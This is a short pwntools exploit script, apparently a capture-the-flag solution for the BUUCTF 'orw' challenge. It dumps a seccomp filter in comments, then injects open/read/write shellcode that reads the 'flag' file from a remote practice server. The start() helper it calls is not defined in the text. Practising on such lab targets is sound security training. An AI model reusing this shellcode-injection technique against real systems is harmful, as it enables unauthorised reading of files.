#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('orw')

host = args.HOST or 'node4.buuoj.cn'
port = int(args.PORT or 26536)

# seccomp-tools dump ./orw
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
#  0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
#  0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
#  0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
#  0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
#  0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
#  0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
#  0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
#  0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
pay = shellcraft.pushstr('flag')
pay += shellcraft.syscall('SYS_open', 'esp', 0)
pay += shellcraft.syscall('SYS_read', 'eax', 'esp', 0x50)
pay += shellcraft.syscall('SYS_write', 1, 'esp', 0x50)
io = start()
io.sendafter(b':', asm(pay))
io.interactive()
